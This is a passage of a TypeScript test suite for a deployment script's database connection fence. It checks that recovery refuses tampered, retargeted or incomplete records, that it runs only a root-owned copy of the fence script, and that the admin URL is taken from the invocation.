    'set -euo pipefail',
    "BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''",
    'DRY_RUN=false',
    'APP_USER="$(id -un)"',
    `APP_DIR=${JSON.stringify(dirs.app)}`,
    `LOG=${JSON.stringify(join(dirs.state, 'calls.log'))}`,
    ': > "${LOG}"',
    // o3d-secops r22: the connection-fence directory is created by the namespace library's walk
    // now, beneath a root-owned parent, and fence_db_connections() calls it rather than carrying a
    // second copy of the `mkdir -p`/`chown`/`chmod` trio. Lifted, so this rig runs the shipped one.
    `CUTOVER_STATE_DIR=${JSON.stringify(dirs.state)}`,
    `CUTOVER_ROOT_DIR=${JSON.stringify(dirs.state)}`,
    `DB_FENCE_DIR=${JSON.stringify(join(dirs.state, 'deploy'))}`,
    // o3d-secops r28: the recovery wrappers take the entrypoint's own cutover lock for their whole
    // read/audit/act sequence, so the entrypoint passes them its path -- and a rig that omitted it
    // would measure a publication the shipped script refuses to perform.
    `LOCK_FILE=${JSON.stringify(join(dirs.state, 'cutover.lock'))}`,
    CUTOVER_DIR_PRIMITIVES,
    `DB_FENCE_STATE=${JSON.stringify(join(dirs.state, 'deploy', 'db-connect-fence.json'))}`,
    `DB_FENCE_SCRIPT=${JSON.stringify(join(dirs.app, 'scripts', 'fence-db-connections.mjs'))}`,
    // THE SHARED LIBRARY, SOURCED FOR REAL (o3d-2sm1.5 r31), then pointed at the harness
    // directory. It is what decides which bytes any of the three entrypoints may execute with
    // DEPLOY_ADMIN_DATABASE_URL, so a harness that re-implemented any part of it would be
    // asserting about a rule the shipped scripts no longer read.
    // ONE redirection, not eleven: the recovery root is substituted in the library's own text and
    // the rest are composed from it BY THE LIBRARY. The eleven-line block that used to stand here
    // restated that composition in TypeScript, which is a second reader of the rule this file is a
    // library to avoid having (o3d-secops r2).
    protectedLibraryLinesAt(dirs.recovery).join('\n'),
    // The shipped resolver, not a stub (o3d-2sm1.5 r32): it is what every fence path in update.sh
    // now calls, and it does two things — resolve the artefact and rewrite the root-owned recovery
    // wrappers — that a stub would silently drop.
    shellFunction(source, 'resolve_fence_script'),
    // o3d-secops r23: db_fence_raise() reaches back for the one part each entrypoint supplies for
    // itself, and for the namespace library's directory predicate. Lifted for the reason the
    // resolver is: a stub would drop the privilege drop the shipped ordering is built on.
    shellFunction(CUTOVER_NS_LIB, 'dir_is_private_to_this_run'),
    shellFunction(source, 'db_fence_helper'),
    // o3d-secops r32: and the three the migration binding is made of. fence_db_connections() CALLS
    // bind_migration_to_fenced_server(), so a rig without it would measure an ordering the shipped
    // script does not have -- which is what it did for one round, as a `command not found`.
    shellFunction(source, 'db_fence_migration_helper'),
    shellFunction(source, 'bind_migration_to_fenced_server'),
    shellFunction(source, 'require_migration_landed_on_fenced_server'),
    // The two recovery commands, exactly as update.sh sets them: the PATHS of the root-owned
    // wrappers, not a command line (o3d-2sm1.5 r32). Setting them empty here would let a banner
    // that prints nothing pass every assertion about what it names.
    'DB_FENCE_RELEASE_CMD="${DB_FENCE_RELEASE_WRAPPER}"',
    'DB_FENCE_REFENCE_CMD="${DB_FENCE_REFENCE_WRAPPER}"',
    // The absolute path update.sh prints in the one refusal that tells an operator to re-run it
    // with a credential on the invocation (o3d-2sm1.5 r32). Named here because `set -u` aborts on
    // it, which is how a harness discovers that a refusal now carries a variable.
    `IMS_ENTRYPOINT_PATH=${JSON.stringify(join(process.cwd(), 'scripts/update.sh'))}`,
    'DB_FENCE_IDENTITY_FROM_RECORD=false',
    'DB_FENCE_ADOPTING=false',
    "DB_FENCE_RECOVERY_REASON=''",
    "DB_FENCE_IDENTITY_MISMATCH=''",
    'DB_FENCE_UP=false',
    'DB_FENCE_RAISED=false',
    'SCHEMA_TOUCHED=false',
    "MIGRATION_DATABASE_URL=''",
    'info(){ :; }',
    'success(){ echo "SUCCESS: $*"; }',
    'warn(){ echo "WARN: $*"; }',
    'error(){ echo "ERROR: $*" >&2; }',
    'die(){ echo "DIE: $*" >&2; exit 9; }',
    // Root-only, and not what any of this is about: the ownership of the recovery directory is
    // asserted by reading the shipped source, not by a test that cannot become root.
    'chown(){ :; }',
    // THE TWO .env-DRIFT QUESTIONS ARE LOGGED RATHER THAN STUBBED SILENT. Whether they are ASKED
    // is part of the claim: on the recovery path there is no file to ask them about, and a
    // recovery that asked them anyway would refuse. tests/scripts/db-connection-fence.test.ts
    // exercises what they actually answer.
    'require_env_file_is_sole_definition(){ echo "require_env_file_is_sole_definition" >> "${LOG}"; return 0; }',
    'require_start_identity_unchanged(){ echo "require_start_identity_unchanged" >> "${LOG}"; return 0; }',
    "DB_IDENTITY_SOURCE_REASON=''",
    "DB_IDENTITY_DRIFT_REASON=''",
    'DB_IDENTITY_PINNED_HOST=""; DB_IDENTITY_PINNED_PORT=""; DB_IDENTITY_PINNED_USER=""; DB_IDENTITY_PINNED_DATABASE=""',
    // The one process boundary this cannot cross: node, as the application user. It records the
    // whole argument vector — which script, which mode, which four identity values — and it
    // WRITES THE STATE FILE on --fence, because that is what the real one does and the adoption
    // path branches on whether that file exists.
    'run_as_user(){',
    '  shift',
    '  echo "run_as_user $*" >> "${LOG}"',
    '  case "$*" in',
    // o3d-secops r23: the helper no longer writes the record — root does, out of the plan this
    // prints. The stub answers the plan the shipped `--plan` mode would, derived from the identity
    // it is passed, because root validates it against the database and role root itself supplied.
    `    *--plan*) printf '{"database":"%s","owner_role":"imsapp","app_role":"%s","admin_role":"deployadmin","revoked":["PUBLIC","imsapp"],"datacl_before":null,"fenced_at":"2026-01-01T00:00:00.000Z"}\\n' "\${DB_IDENTITY_DATABASE:-imsdb}" "\${DB_IDENTITY_USER:-imsapp}"; return 0 ;;`,
    '    *--fence*) return "${FENCE_EXIT:-0}" ;;',
    "    *--print-migration-url*) printf 'postgresql://admin:pw@127.0.0.1:5432/imsdb?options=-c%%20role%%3Dimsapp\\n'; return 0 ;;",
    '  esac',
    '  return 0',
    '}',
    'FENCE_EXIT=0',
    shellFunction(source, 'env_file_value'),
    shellFunction(source, 'valid_tcp_port'),
    shellFunction(source, 'resolve_db_identity'),
    shellFunction(source, 'require_db_identity'),
    durabilityFunctions(source),
    shellFunction(source, 'publish_fence_recovery_record'),
    shellFunction(source, 'adopt_identity_from_recovery_record'),
    shellFunction(source, 'require_adoption_identity'),
    shellFunction(source, 'refuse_adoption_identity_mismatch'),
    shellFunction(source, 'fence_db_connections'),
    shellFunction(source, 'release_db_connections'),
    shellFunction(source, 'refence_db_connections'),
    shellFunction(source, 'adopt_db_connections'),
    // EXACTLY the line update.sh's initialisation runs, with EXACTLY the reader it uses. With
    // .env deleted this leaves DATABASE_URL empty and DB_FENCE_IDENTITY_ARGS empty — the premise
    // of the whole finding, established by running the shipped code rather than by assertion.
    'DATABASE_URL="$(env_file_value DATABASE_URL "${APP_DIR}/.env")"',
    'resolve_db_identity "${DATABASE_URL:-}" || true',
    'echo "IDENTITY_ARGS=${#DB_FENCE_IDENTITY_ARGS[@]}"',
    ...body,
  ].join('\n')
}

function readCalls(state: string): string {
  const path = join(state, 'calls.log')
  return existsSync(path) ? readFileSync(path, 'utf8') : ''
}

test('a deleted .env does not stop the connection fence being adopted', () => {
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. delete the `require_adoption_identity || die` call from adopt_db_connections() — i.e.
  //      put r28 back, where the adoption depended on ${APP_DIR}/.env — and PHASE 2 fails: the
  //      log holds no `--fence` line at all, because fence_db_connections() dies on
  //      "The application's connection identity could not be read from DATABASE_URL".
  //   2. delete the ${DB_FENCE_SCRIPT_COPY} arm of db_fence_script_in_use() and phase 2 fails the
  //      same way, with "Neither ... nor the root-owned copy ... exists": the checkout's script
  //      is gone, and it was the only thing that could raise the fence.
  //   3. make publish_fence_recovery_record() a no-op and phase 2 fails on the missing record,
  //      naming it — the record has to be written when the fence is RAISED or there is nothing
  //      to recover from.
  const { outer, app, state, recovery } = anchoredRoots('ims-recover-')
  try {
    // PHASE 1 — an ordinary run raises a fence, with .env in place and the script in the
    // checkout. Nothing here is about recovery; it is what produces the record.
    mkdirSync(join(app, 'scripts'), { recursive: true })
    writeFileSync(join(app, 'scripts', 'fence-db-connections.mjs'), '// the shipped fence script\n')
    // …and its imports, because publishing the protected artefact VENDORS them (o3d-2sm1.5 r32).
    writeCheckoutPg(app)
    writeFileSync(join(app, '.env'), 'DATABASE_URL=postgresql://imsapp:pw@127.0.0.1:5432/imsdb\n')
    const raised = runShell(
      fenceRecoveryHarness({ app, state, recovery }, ['DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb', 'fence_db_connections', 'echo "RAISED=${DB_FENCE_UP}"']),
    )
    assert.equal(raised.status, 0, `the ordinary fence must succeed:\n${raised.output}`)
    assert.match(raised.output, /^IDENTITY_ARGS=4$/m, 'precondition: .env identified the connection on the ordinary run')
    assert.match(raised.output, /^RAISED=true$/m, `and the fence went up:\n${raised.output}`)

    // The record it wrote is a record, and it is complete.
    const record = readFileSync(join(recovery, 'db-fence-identity.env'), 'utf8')
    assert.match(record, /^db_app_host=127\.0\.0\.1$/m, `the record must name the host:\n${record}`)
    assert.match(record, /^db_app_port=5432$/m, `and the port:\n${record}`)
    assert.match(record, /^db_app_user=imsapp$/m, `and the role:\n${record}`)
    assert.match(record, /^db_app_database=imsdb$/m, `and the database:\n${record}`)
    assert.match(record, /^fence_identity_complete=1$/m, 'and end with the sentinel a truncated one would not have')
    assert.equal(
      readFileSync(join(recovery, 'app', 'scripts', 'fence-db-connections.mjs'), 'utf8'),
      '// the shipped fence script\n',
      'and the script that raised the fence must have been copied where the application cannot delete it',
    )
    // AND IT WAS WRITTEN BEFORE THE REVOKE, not after: a record published after the durable act
    // is absent on the one run that matters, the one killed in between.
    const raisedLog = readCalls(state)
    assert.match(raisedLog, /--fence/, 'precondition: the ordinary run really invoked the fence')

    // PHASE 2 — THE LOAD-BEARING CASE. The application account has since deleted BOTH of the
    // files the adoption used to need, and a previous run had already begun migrating.
    rmSync(join(app, '.env'))
    rmSync(join(app, 'scripts', 'fence-db-connections.mjs'))
    const adopted = runShell(
      fenceRecoveryHarness({ app, state, recovery }, [
        'DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb',
        'SCHEMA_TOUCHED=true',
        'adopt_db_connections',
        'echo "ADOPTED=${DB_FENCE_UP}"',
        'echo "FROM_RECORD=${DB_FENCE_IDENTITY_FROM_RECORD}"',
      ]),
    )

    // PRECONDITION, and it is the finding: with .env gone the shipped initialisation leaves the
    // identity EMPTY. Everything below is the recovery doing work, not .env being read after all.
    assert.match(adopted.output, /^IDENTITY_ARGS=0$/m, `with .env deleted the file identifies nothing:\n${adopted.output}`)

    // THE FENCE IS ACTUALLY ADOPTED — re-applied and re-drained — not merely attempted.
    const log = readCalls(state)
    assert.match(log, /--fence /, `the standing fence must be re-applied:\n${log}`)
    assert.match(
        log,
      /--app-host=127\.0\.0\.1 --app-port=5432 --app-user=imsapp --app-database=imsdb/,
      `and aimed at the identity the record says that fence was raised against:\n${log}`,
    )
    assert.ok(
      log.includes(join(recovery, 'app', 'scripts', 'fence-db-connections.mjs')),
      `and run from the root-owned copy, because the checkout's is gone:\n${log}`,
    )
    assert.ok(
      !log.includes(join(app, 'scripts', 'fence-db-connections.mjs')),
      `never from the path the application user deleted:\n${log}`,
    )
    assert.match(adopted.output, /^ADOPTED=true$/m, `and the run must record the fence as HELD:\n${adopted.output}`)
    assert.match(adopted.output, /^FROM_RECORD=true$/m, 'through the record, which is what makes it independent of the file')
    assert.equal(adopted.status, 0, `and the adoption itself must not refuse:\n${adopted.output}`)

    // AND THE TWO QUESTIONS ABOUT .env WERE NOT ASKED. They compare the identity in hand against
    // what a file will give systemd at exec; with no file, asking them is a refusal, and a
    // refusal here is the abandoned fence all over again.
    assert.ok(
      !/require_start_identity_unchanged/.test(log),
      `the drift re-read cannot be asked of a file that is gone:\n${log}`,
    )
    assert.ok(
      !/require_env_file_is_sole_definition/.test(log),
      `nor the sole-source question about it:\n${log}`,
    )
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
})

test('a recovery with no privileged credential refuses, naming the argument that supplies it', () => {
  // The identity is recoverable from a file this script writes. The PASSWORD is not, and must not
  // be: DEPLOY_ADMIN_DATABASE_URL comes from the root invocation or from ${APP_DIR}/.env, and on
  // this path that file is gone. The refusal has to say so.
  //
  // MUTATION ROUTE: drop the `[[ -n "${DEPLOY_ADMIN_DATABASE_URL}" ]] || die` from
  // adopt_db_connections() and this test fails at the status assertion — the run proceeds to
  // invoke the fence with an empty admin URL, which is the shape that revokes CONNECT and then
  // cannot get back in.
  const { outer, app, state, recovery } = anchoredRoots('ims-recover-')
  try {
    mkdirSync(join(state, 'deploy'), { recursive: true })
    writeFileSync(join(state, 'deploy', 'db-connect-fence.json'), '{}\n')
    plantProtectedArtefact(recovery, '// copy\n')
    writeFileSync(
      join(recovery, 'db-fence-identity.env'),
      'db_app_host=127.0.0.1\ndb_app_port=5432\ndb_app_user=imsapp\ndb_app_database=imsdb\nfence_identity_complete=1\n',
    )
    const result = runShell(
      fenceRecoveryHarness({ app, state, recovery }, ["DEPLOY_ADMIN_DATABASE_URL=''", 'SCHEMA_TOUCHED=true', 'adopt_db_connections', 'echo "PAST=yes"']),
    )
    assert.notEqual(result.status, 0, `a recovery with no privileged connection must refuse:\n${result.output}`)
    assert.ok(!/PAST=yes/.test(result.output), 'and nothing after it may run')
    assert.match(result.output, /DEPLOY_ADMIN_DATABASE_URL is not set/, `naming the argument:\n${result.output}`)
    assert.match(
      result.output,
      /DEPLOY_ADMIN_DATABASE_URL='postgresql:\/\/ADMIN:PASSWORD@HOST:PORT\/DATABASE' bash \/\S+\/scripts\/update\.sh/,
      'and saying how to supply it on the invocation, as an ABSOLUTE path that would run if pasted (o3d-2sm1.5 r32)',
    )
    // AND THE OTHER HALF OF THE SAME SENTENCE NAMES THE ROOT-OWNED WRAPPER, not a command line
    // built out of the checkout. This is the instruction an operator follows when the recovery
    // itself cannot go on, so it is the one that must not point at an application-owned path.
    assert.match(result.output, new RegExp(`release the fence by hand.*${recovery}/release-db-fence`), `naming the wrapper:\n${result.output}`)
    // PRECONDITION: the identity itself WAS recovered, so this refusal is about the credential
    // and not about a record that could not be read.
    assert.match(result.output, /^IDENTITY_ARGS=0$/m, 'the file gave nothing')
    assert.match(result.output, /imsapp@127\.0\.0\.1:5432\/imsdb/, 'and the record gave the identity')
    assert.ok(!/--fence/.test(readCalls(state)), 'and no fence was attempted without a connection that survives it')
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
})

const RECOVERY_RECORD_REFUSALS: ReadonlyArray<{ label: string; record: string | null; says: RegExp }> = [
  { label: 'no record at all', record: null, says: /there is no record at/ },
  {
    label: 'a record truncated before its sentinel',
    record: 'db_app_host=127.0.0.1\ndb_app_port=5432\ndb_app_user=imsapp\ndb_app_data',
    says: /does not end with fence_identity_complete=1/,
  },
  {
    label: 'a record missing the database',
    record: 'db_app_host=127.0.0.1\ndb_app_port=5432\ndb_app_user=imsapp\nfence_identity_complete=1\n',
    says: /does not state all of db_app_host, db_app_user and db_app_database/,
  },
  {
    label: 'a record whose port is not a port',
    record: 'db_app_host=127.0.0.1\ndb_app_port=nowhere\ndb_app_user=imsapp\ndb_app_database=imsdb\nfence_identity_complete=1\n',
    says: /which is not a port number/,
  },
]

for (const scenario of RECOVERY_RECORD_REFUSALS) {
  test(`a recovery refuses rather than guess when the record is ${scenario.label}`, () => {
    // A HALF-READ IDENTITY IS A DIFFERENT DATABASE. The whole reason the fence is TOLD its four
    // values is that working them out produced a locally correct answer seven times running; a
    // recovery is not the moment to relax that, so anything short of four values it can vouch for
    // is a refusal and never a default.
    //
    // MUTATION ROUTE: drop the fence_identity_complete=1 check from
    // adopt_identity_from_recovery_record() and the truncated case stops refusing — it adopts
    // host, port and role from the record and NO database, which is three of four values about a
    // database nothing named.
    const { outer, app, state, recovery } = anchoredRoots('ims-recover-')
    try {
      mkdirSync(join(state, 'deploy'), { recursive: true })
      writeFileSync(join(state, 'deploy', 'db-connect-fence.json'), '{}\n')
      plantProtectedArtefact(recovery, '// copy\n')
      if (scenario.record !== null) writeFileSync(join(recovery, 'db-fence-identity.env'), scenario.record)
      const result = runShell(
        fenceRecoveryHarness({ app, state, recovery }, [
          'DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb',
          'SCHEMA_TOUCHED=true',
          'adopt_db_connections',
          'echo "PAST=yes"',
        ]),
      )
      assert.notEqual(result.status, 0, `an unusable record must be a refusal:\n${result.output}`)
      assert.ok(!/PAST=yes/.test(result.output), 'and nothing after it may run')
      assert.match(result.output, scenario.says, `and it must say what is wrong with the record:\n${result.output}`)
      assert.ok(!/--fence/.test(readCalls(state)), `and nothing may be re-fenced on a guess:\n${readCalls(state)}`)
    } finally {
      rmSync(outer, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-2sm1.5 r30 — A TRUSTED SOURCE CONSULTED ONLY WHEN THE UNTRUSTED ONE FAILS IS NOT A TRUST
// BOUNDARY (Codex CRITICAL + HIGH).
//
// r29 published the two artefacts above and then made each of them the FALLBACK. That closes
// DELETION and leaves SUBSTITUTION completely open: the account this defends against does not
// need to remove its file, it needs to supply one that works. The three tests below are the two
// substitutions Codex named, and the record's own immutability under an adoption.
// ---------------------------------------------------------------------------

/** Raise a fence the ordinary way, against a real .env and a real checkout script. */
function raiseFenceFor(dirs: { app: string; state: string; recovery: string }, script = '// the shipped fence script\n'): void {
  mkdirSync(join(dirs.app, 'scripts'), { recursive: true })
  writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), script)
  writeCheckoutPg(dirs.app)
  writeFileSync(join(dirs.app, '.env'), 'DATABASE_URL=postgresql://imsapp:pw@127.0.0.1:5432/imsdb\n')
  const raised = runShell(
    fenceRecoveryHarness(dirs, [
      'DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb',
      'fence_db_connections',
      'echo "RAISED=${DB_FENCE_UP}"',
    ]),
  )
  assert.equal(raised.status, 0, `precondition: the ordinary fence must succeed:\n${raised.output}`)
  assert.match(raised.output, /^RAISED=true$/m, `precondition: and the fence must go up:\n${raised.output}`)
}

function recoveryDirs(): { outer: string; app: string; state: string; recovery: string } {
  return anchoredRoots('ims-r30-')
}

function cleanUp(dirs: { outer: string }): void {
  rmSync(dirs.outer, { recursive: true, force: true })
}

test('an .env retargeted to another database cannot redirect a standing fence', () => {
  // THE CRITICAL, EXACTLY AS DESCRIBED. A legitimate run fences database A over a touched schema.
  // The application account then replaces ${APP_DIR}/.env with a perfectly valid, internally
  // consistent identity for database B and a matching admin URL. Nothing is tampered with: the
  // marker is untouched, the record is untouched, and the sole-source and drift checks would
  // pass, because all they prove is that the replacement agrees with itself.
  //
  // The record holds the identity the STANDING FENCE WAS AIMED AT — that is why it is written
  // before the revoke — so this is not a preference question. A mismatch means the database the
  // fence guards is not the database the file names, and the run refuses before touching either.
  //
  // MUTATION ROUTE (verified by making the change locally and re-running): put r29's first line
  // back at the top of require_adoption_identity() —
  //   require_db_identity && return 0
  // — and this test fails at the status assertion and at both log assertions: the run adopts the
  // replacement, and the log shows `--fence ... --app-database=otherdb` while the record still
  // says imsdb. Removing only the `refuse_adoption_identity_mismatch` call from
  // adopt_db_connections() fails the same way.
  const dirs = recoveryDirs()
  try {
    raiseFenceFor(dirs)

    // PHASE 2 — the substitution. Four good values, a different database.
    writeFileSync(
      join(dirs.app, '.env'),
      'DATABASE_URL=postgresql://otherapp:pw@127.0.0.1:5432/otherdb\nDEPLOY_ADMIN_DATABASE_URL=postgresql://admin:pw@127.0.0.1:5432/otherdb\n',
    )
    const redirected = runShell(
      fenceRecoveryHarness(dirs, [
        'DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/otherdb',
        'SCHEMA_TOUCHED=true',
        'adopt_db_connections',
        'echo "PAST=yes"',
      ]),
    )

    // PRECONDITION, and it is the whole point: the replacement .env is not malformed. The shipped
    // reader accepts it and produces four values, so nothing below is a refusal about a bad file.
    assert.match(redirected.output, /^IDENTITY_ARGS=4$/m, `the replacement must be a perfectly good identity:\n${redirected.output}`)

    assert.notEqual(redirected.status, 0, `a retargeted .env must be a refusal:\n${redirected.output}`)
    assert.ok(!/PAST=yes/.test(redirected.output), 'and nothing after it may run')
    assert.match(redirected.output, /DO NOT NAME THE SAME DATABASE/, `and it must say what is wrong:\n${redirected.output}`)
    assert.match(redirected.output, /otherapp@127\.0\.0\.1:5432\/otherdb/, 'naming what the file now says')
    assert.match(redirected.output, /imsapp@127\.0\.0\.1:5432\/imsdb/, 'and what the record says that fence was aimed at')

    // NOTHING REACHED EITHER DATABASE. Not a re-fence of B, and not a release of A.
    const log = readCalls(dirs.state)
    assert.ok(!/--fence/.test(log), `no database may be re-fenced on the file's answer:\n${log}`)
    assert.ok(!/--release/.test(log), `and none released on it either:\n${log}`)

    // AND THE RECORD IS UNTOUCHED, so a re-run with the file put back adopts the same fence.
    assert.match(
      readFileSync(join(dirs.recovery, 'db-fence-identity.env'), 'utf8'),
      /^db_app_database=imsdb$/m,
      'the record must still name the database the fence was raised on',
    )
  } finally {
    cleanUp(dirs)
  }
})

test('a fence script replaced in the checkout is never the one that runs', () => {
  // THE HIGH. r29 selected ${DB_FENCE_SCRIPT} whenever it EXISTED, so the application account
  // could REPLACE it rather than delete it — and every caller hands the result
  // DEPLOY_ADMIN_DATABASE_URL and runs it as the application user. The three call sites below are
  // the ones Codex named, and the third is the reach of it: the exit trap's re-fence is the path
  // that runs when everything else has already gone wrong.
  //
  // MUTATION ROUTE (verified by making the change locally and re-running): put r29's first arm
  // back at the top of db_fence_script_in_use() —
  //   if [[ -f "${DB_FENCE_SCRIPT}" ]]; then printf '%s' "${DB_FENCE_SCRIPT}"; return 0; fi
  // — and all three cases fail at the "never the checkout's path" assertion, because the
  // substituted file is chosen every time. Removing only the `publish_fence_script_copy` call
  // from publish_fence_recovery_record() fails at the "the protected copy is still the shipped
  // one" assertion instead.
  const cases: ReadonlyArray<{ label: string; body: string[] }> = [
    { label: 'the adoption', body: ['SCHEMA_TOUCHED=true', 'adopt_db_connections'] },
    { label: 'the release', body: ['release_db_connections'] },
    {
      label: "the exit trap's re-fence",
      body: ['SCHEMA_TOUCHED=true', 'DB_FENCE_RAISED=true', 'refence_db_connections || echo "REFENCE_RC=$?"'],
    },
  ]
  for (const scenario of cases) {
    const dirs = recoveryDirs()
    try {
      raiseFenceFor(dirs)
      const protectedCopy = join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs')
      const checkoutScript = join(dirs.app, 'scripts', 'fence-db-connections.mjs')
      const recordBefore = readFileSync(join(dirs.recovery, 'db-fence-identity.env'), 'utf8')

      // THE SUBSTITUTION. The file is not deleted — that is r29's case, and it is closed. It is
      // REPLACED, which is the same act with a working file left behind.
      writeFileSync(checkoutScript, '// SUBSTITUTED BY THE APPLICATION ACCOUNT\n')

      const result = runShell(
        fenceRecoveryHarness(dirs, ['DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb', ...scenario.body]),
      )
      const log = readCalls(dirs.state)

      assert.ok(log.length > 0, `${scenario.label}: precondition — the fence helper was invoked at all:\n${result.output}`)
      assert.ok(log.includes(protectedCopy), `${scenario.label}: must run the root-owned copy:\n${log}`)
      assert.ok(!log.includes(checkoutScript), `${scenario.label}: and never the path the application account rewrote:\n${log}`)

      // AND THE SUBSTITUTE NEVER BECOMES THE PROTECTED ONE. An adoption that republished the copy
      // would launder exactly the file it just refused to run.
      assert.equal(
        readFileSync(protectedCopy, 'utf8'),
        '// the shipped fence script\n',
        `${scenario.label}: the protected copy must still be the one the fence was raised with`,
      )
      assert.equal(
        readFileSync(join(dirs.recovery, 'db-fence-identity.env'), 'utf8'),
        recordBefore,
        `${scenario.label}: and the record — digest included — must not have been rewritten by a run that is adopting`,
      )
    } finally {
      cleanUp(dirs)
    }
  }
})

test('a protected fence script that is not the one the record names is refused', () => {
  // The digest is what BINDS the copy to the record, and it is why the initial fence publishes
  // the script and then runs the published copy rather than the original: r29 copied and then
  // executed ${DB_FENCE_SCRIPT}, so the protected copy was not guaranteed to be the code that
  // wrote ${DB_FENCE_STATE}. With the two bound, a copy that is not the recorded one is a state
  // only root could have produced, and it is a refusal rather than a shrug.
  //
  // MUTATION ROUTE: delete the `[[ "${actual}" != "${recorded}" ]]` arm from
  // db_fence_script_in_use() and this test fails at the status assertion — the adoption runs the
  // unrecorded script.
  const dirs = recoveryDirs()
  try {
    mkdirSync(join(dirs.state, 'deploy'), { recursive: true })
    writeFileSync(join(dirs.state, 'deploy', 'db-connect-fence.json'), '{}\n')
    plantProtectedArtefact(dirs.recovery, '// not the recorded script\n')
    writeFileSync(
      join(dirs.recovery, 'db-fence-identity.env'),
      [
        'db_app_host=127.0.0.1',
        'db_app_port=5432',
        'db_app_user=imsapp',
        'db_app_database=imsdb',
        `fence_script_sha256=${'0'.repeat(64)}`,
        'fence_identity_complete=1',
        '',
      ].join('\n'),
    )
    const result = runShell(
      fenceRecoveryHarness(dirs, [
        'DEPLOY_ADMIN_DATABASE_URL=postgres://admin@127.0.0.1:5432/imsdb',
        'SCHEMA_TOUCHED=true',
        'adopt_db_connections',
        'echo "PAST=yes"',
      ]),
    )
    assert.notEqual(result.status, 0, `an unrecorded protected script must be a refusal:\n${result.output}`)
    assert.ok(!/PAST=yes/.test(result.output), 'and nothing after it may run')
    assert.match(result.output, /is not the one the recovery record binds to this fence/, `and it must say why:\n${result.output}`)
    assert.ok(!/--fence/.test(readCalls(dirs.state)), `and nothing may be re-fenced with it:\n${readCalls(dirs.state)}`)
  } finally {
    cleanUp(dirs)
  }
})

test('the privileged connection comes from the root invocation, not from the application-owned file', () => {
  // FOUND BY THE SWEEP the CRITICAL asked for, and it is the same shape a third time:
  // DEPLOY_ADMIN_DATABASE_URL was resolved as "${_env_file_admin_url:-${DEPLOY_ADMIN_DATABASE_URL}}"
  // — the application-owned file first, root's own invocation only as a fallback. The recovery
  // refusal tells an operator to supply this variable on the command line precisely because
  // ${APP_DIR}/.env cannot be relied on at that moment, and a file that could then silently
  // substitute a different privileged connection makes that instruction meaningless.
  //
  // MUTATION ROUTE: swap the two halves of the `:-` back and the first case below reports the
  // file's URL.
  const dir = mkdtempSync(join(tmpdir(), 'ims-r30-admin-'))
  try {
    writeFileSync(
      join(dir, '.env'),
      'DATABASE_URL=postgresql://imsapp:pw@127.0.0.1:5432/imsdb\nDEPLOY_ADMIN_DATABASE_URL=postgresql://filesays:pw@127.0.0.1:5432/otherdb\n',
    )

    const both = runUpdatePrelude(
      dir,
      ['DEPLOY_ADMIN_DATABASE_URL'],
      'DEPLOY_ADMIN_DATABASE_URL=postgresql://roottyped:pw@127.0.0.1:5432/imsdb',
    )
    assert.equal(both.status, 0, `the prelude must run:\n${both.output}`)
    assert.match(
      both.output,
      /^DEPLOY_ADMIN_DATABASE_URL=postgresql:\/\/roottyped:pw@127\.0\.0\.1:5432\/imsdb$/m,
      `the invocation's value must win:\n${both.output}`,
    )
    assert.match(both.output, /set BOTH on this invocation and in/, `and the disagreement must be announced:\n${both.output}`)

    // AND NOTHING CHANGES ON AN ORDINARY RUN, which is the case that matters operationally:
    // `sudo scripts/update.sh` carries no such variable, so the file still answers.
    const fileOnly = runUpdatePrelude(dir, ['DEPLOY_ADMIN_DATABASE_URL'])
    assert.match(
      fileOnly.output,
      /^DEPLOY_ADMIN_DATABASE_URL=postgresql:\/\/filesays:pw@127\.0\.0\.1:5432\/otherdb$/m,
      `with nothing on the invocation the file answers, exactly as before:\n${fileOnly.output}`,
    )
    assert.ok(!/set BOTH on this invocation/.test(fileOnly.output), 'and there is nothing to announce')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('every adoption call site refuses an identity mismatch, not only the one that holds the fence', () => {
  // update.sh establishes the adoption identity in TWO places: adopt_db_connections(), which
  // HOLDS a fence over a touched schema, and the marker-adoption block, whose other branch
  // RELEASES one. The release branch is the more dangerous of the two to get wrong — `--release`
  // GRANTS CONNECT from the state file's record — so a refusal wired into one and not the other
  // would leave the worse half open. One wording, both sites, and nothing between the call and
  // the refusal that could use the identity first.
  //
  // MUTATION ROUTE: delete either `refuse_adoption_identity_mismatch` line from update.sh and
  // this test fails on the count; move one of them a line further down and it fails on adjacency.
  const source = UPDATE_LINES.join('\n')
  const callSites = UPDATE_LINES.map((line, index) => ({ line, index }))
    .filter((entry) => isCode(entry.line) && /^\s*require_adoption_identity \|\| [a-z_]+=\$\?$/.test(entry.line))
  assert.equal(callSites.length, 2, `precondition: update.sh establishes the adoption identity in two places (${callSites.length})`)

  const refusals = UPDATE_LINES.filter((line) => isCode(line) && /^\s*refuse_adoption_identity_mismatch "/.test(line))
  assert.equal(refusals.length, 2, 'and each of them must go through the shared refusal')

  for (const site of callSites) {
    // The NEXT LINE OF CODE, comments skipped: both call sites carry a paragraph of reasoning
    // between them, and a rule written about raw adjacency would be a rule about prose.
    const next = UPDATE_LINES.findIndex((line, index) => index > site.index && isCode(line))
    assert.match(
      UPDATE_LINES[next] ?? '',
      /^\s*refuse_adoption_identity_mismatch "/,
      `nothing may come between the call and its refusal:\n${UPDATE_LINES.slice(site.index, next + 1).filter(isCode).join('\n')}`,
    )
  }

  // AND THE REFUSAL IS FATAL, on exactly the code require_adoption_identity() returns for it.
  const refusal = shellFunction(source, 'refuse_adoption_identity_mismatch')
  assert.match(refusal, /-eq 2 \]\] \|\| return 0/, `it must fire on the mismatch code and nothing else:\n${refusal}`)
